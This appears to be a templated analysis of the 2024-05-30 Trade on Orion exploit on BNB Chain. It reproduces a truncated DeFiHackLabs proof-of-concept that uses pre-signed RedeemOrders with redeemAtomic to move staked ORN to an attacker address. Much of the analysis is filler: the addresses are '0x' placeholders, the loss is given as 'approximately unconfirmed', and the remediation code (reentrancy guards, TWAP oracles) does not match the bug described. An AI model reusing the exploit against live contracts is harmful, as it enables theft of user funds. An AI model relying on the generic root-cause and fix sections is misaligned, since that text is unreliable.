# Trade on Orion — Order Book-Based DEX Order Processing Vulnerability Analysis

| Item | Details |
|------|------|
| **Date** | 2024-05-30 |
| **Protocol** | Trade on Orion |
| **Chain** | BNB Chain |
| **Loss** | Unconfirmed |
| **Attacker** | [0x](https://bscscan.com/address/0x) |
| **Attack Tx** | [0x](https://bscscan.com/tx/0x) |
| **Vulnerable Contract** | [0x](https://bscscan.com/address/0x) |
| **Root Cause** | Order book-based DEX order processing vulnerability |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2024-05/Tradeonorion_exp.sol) |

---
## 1. Vulnerability Overview

Trade on Orion is a DeFi protocol operating on the BNB Chain, which suffered an **order book manipulation** attack on 2024-05-30.
The attacker exploited an order book-based DEX order processing vulnerability, causing approximately **unconfirmed** in damages.

### Key Vulnerability Summary
- **Classification**: Order book manipulation
- **Impact**: Unconfirmed protocol asset loss
- **Attack Vector**: Logic vulnerability

---
## 2. Vulnerable Code Analysis (❌/✅ Comments)

```solidity
// ❌ Vulnerable implementation example
// Issue: Order book-based DEX order processing vulnerability
// Attacker exploits this logic to gain illegitimate profit

// Trade on Orion (VulnContract) interface — order book manipulation vulnerable functions
interface VulnContract {
    // ❌ Vulnerable: no account parameter validation in depositAssetTo
    // Can inflate the balance of an arbitrary account by depositing assets to it
    function depositAssetTo(address assetAddress, uint112 amount, address account) external;

    // ❌ Vulnerable: insufficient order signature validation when calling redeemAtomic after lockStake
    // Allows atomic withdrawal of another user's stake using a forged LibAtomic.RedeemOrder
    function lockStake(uint64 amount) external;
    function redeemAtomic(LibAtomic.RedeemOrder calldata order, bytes calldata secret) external;

    // ❌ Vulnerable: withdrawTo allows arbitrary amount withdrawal without balance validation
    function withdrawTo(address assetAddress, uint112 amount, address to) external;
    function requestReleaseStake() external;
    function getLiabilities(address user) external view returns (MarginalFunctionality.Liability[] memory);
    function getBalances(address[] memory assetsAddresses, address user) external view returns (int192[] memory);
}

interface Routers {
    // ❌ Vulnerable: swapCompact internally calls VulnContract.depositAssetTo
    // Allows depositing assets to arbitrary accounts by inserting a malicious router into the swap path
    function swapCompact() external payable returns (uint256);
}

// ✅ Correct implementation: fix depositAssetTo caller to msg.sender
function safeDepositAssetTo(address assetAddress, uint112 amount, address account) external {
    // ✅ account must be msg.sender itself (depositing to another account is prohibited)
    require(account == msg.sender, "Deposit: account must be sender");
    // ✅ Verify that the asset address is on the allowlist
    require(supportedAssets[assetAddress], "Deposit: asset not supported");
    IERC20(assetAddress).transferFrom(msg.sender, address(this), amount);
    balances[account][assetAddress] += amount;
    emit AssetDeposited(account, assetAddress, amount);
}
```

---
## 3. Attack Flow (ASCII Diagram)

```
Attacker
  │
  ▼
[Identify Vulnerability] ─────── Trade on Orion Contract
  │
  ▼
[Send Malicious Transaction] ─── Call Vulnerable Function
  │                                (Bypass Validation)
  ▼
[Drain Assets] ──────────────── Secure Profit
```

---
## 4. PoC Code (Core Logic + Comments)

```solidity
// Source: DeFiHackLabs - Tradeonorion_exp.sol
// Chain: BNB Chain | Date: 2024-05-30

    function testExploit() public {
        emit log_named_decimal_uint("[Begin] Attacker ORN balance before exploit", ORN.balanceOf(address(this)), 8);
        emit log_named_decimal_uint("[Begin] Attacker BNB balance before exploit", address(this).balance, 18);
        emit log_named_decimal_uint("[Begin] Attacker XRP balance before exploit", XRP.balanceOf(address(this)), 18);
        emit log_named_decimal_uint("[Begin] Attacker BUSDT balance before exploit", BUSDT.balanceOf(address(this)), 18);
        console.log("==============");
        attack();
    }

    function attack() public {
        // Step 1
        address[] memory add = new address[](1);
        add[0] = address(ORN);
        (alice, alicePk) = makeAddrAndKey("alice");
        deal(address(ORN), address(alice), 10_000_000);
        deal(address(BUSDT), address(alice), 1 ether);
        deal(address(WBNB), address(alice), 0.005 ether);
        vm.startPrank(alice);

        // Step 2
        BUSDT.approve(address(vulnContract), type(uint192).max);

        vulnContract.depositAssetTo(address(BUSDT), 1 ether, address(alice));

        ORN.approve(address(vulnContract), type(uint192).max);

        vulnContract.depositAssetTo(address(ORN), 10_000_000, address(alice));

        vulnContract.lockStake(10_000_000);

        //Step 3
        signerPrivateKey = 123_456;
        attacker = vm.addr(signerPrivateKey);
        bytes memory hash_1 = abi.encodePacked("test");
        LibAtomic.RedeemOrder memory order_1 = LibAtomic.RedeemOrder({
            sender: address(alice),
            receiver: address(attacker),
            claimReceiver: address(attacker),
            asset: address(ORN),
            amount: 10_000_000,
            expiration: 3_433_733_152_542,
            secretHash: keccak256(abi.encodePacked("test")),
            signature: hex"7eb28027e17378185c859be36dfe518ecdb6bd004bb7179089656c70bc017680680a14257e7d638e2b98d6ffcc8a4577decb9f47568e62040ea8da9b72717fb91b"
        });

        vulnContract.redeemAtomic(order_1, hash_1);

        //Step 3.1

        vulnContract.requestReleaseStake();
        bytes memory hash_2 = abi.encodePacked("test_1");
        LibAtomic.RedeemOrder memory order_2 = LibAtomic.RedeemOrder({
            sender: address(alice),
            receiver: address(attacker),
            claimReceiver: address(attacker),
            asset: address(ORN),
            amount: 10_000_000,
            expiration: 3_433_733_152_542,
            secretHash: keccak256(abi.encodePacked("test_1")),
            signature: hex"319ba837db29aba1f3a2ad365d2714dd83238e1393d6a7b033927faa53b57ba27168a7ebf9ac04512df3f73644b2716922f528eabc08cac8bb800a00108f58671b"
```

> **Note**: The code above is a PoC for educational purposes. Refer to the original file in the DeFiHackLabs repository.

---
## 5. Vulnerability Classification (Table)

| Criterion | Details |
|-----------|------|
| **DASP Top 10** | Logic vulnerability |
| **Attack Type** | Smart contract bug |
| **Vulnerability Category** | DeFi attack |
| **Attack Complexity** | Medium |
| **Preconditions** | Access to vulnerable function |
| **Impact Scope** | Partial assets |
| **Patchability** | High (resolvable via code fix) |

---
## 6. Remediation Recommendations

### Immediate Actions
1. **Pause vulnerable functions**: Apply emergency pause to the exploited functions
2. **Assess damage**: Identify the scale of lost assets and classify affected users
3. **Notify stakeholders**: Immediately alert relevant DEXes, bridges, and security research teams

### Code Fixes
```solidity
// Recommendation 1: Reentrancy protection (using OpenZeppelin ReentrancyGuard)
import "@openzeppelin/contracts/security/ReentrancyGuard.sol";

contract Fixed is ReentrancyGuard {
    function protectedFunction() external nonReentrant {
        // Safe logic
    }
}

// Recommendation 2: Follow CEI (Checks-Effects-Interactions) pattern
function safeWithdraw(uint256 amount) external {
    // 1. Checks: validate first
    require(balances[msg.sender] >= amount, "Insufficient balance");
    // 2. Effects: update state
    balances[msg.sender] -= amount;
    // 3. Interactions: external calls last
    token.transfer(msg.sender, amount);
}

// Recommendation 3: Oracle manipulation prevention (use TWAP)
function getSafePrice() internal view returns (uint256) {
    // ✅ Use short-term TWAP to prevent instantaneous price manipulation
    return oracle.getTWAP(30 minutes);
    // ❌ Do not rely solely on current spot price
}
```

### Long-Term Improvements
- **Independent security audits** (at least 2 auditing firms)
- **Bug bounty program** operation
- **Monitoring system** implementation (Forta, OpenZeppelin Defender, etc.)
- **Emergency stop mechanism** implementation

---
## 7. Lessons Learned

### For Developers
1. **Order book manipulation attacks are preventable**: Defensible with proper validation and pattern application
2. **Consider economic incentives**: All functions must be designed with attacker economic motivation in mind
3. **Audit priority**: Functions that directly handle assets are the top priority for auditing

### For Protocol Operators
1. **Real-time monitoring**: Establish a system to immediately detect abnormal large-scale transactions
2. **Incident response plan**: Maintain a response playbook that can be executed immediately upon attack
3. **Insurance coverage**: Distribute risk through DeFi insurance protocols

### For the Broader DeFi Ecosystem
- The **2024-05-30** Trade on Orion incident reconfirmed the danger of **order book manipulation** attacks in the BNB Chain ecosystem
- Similar protocols should immediately audit for the same vulnerability
- Strengthening community-level security information sharing is recommended

---
*This document was prepared for educational and security research purposes. Do not misuse.*
*PoC source: [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2024-05/Tradeonorion_exp.sol)*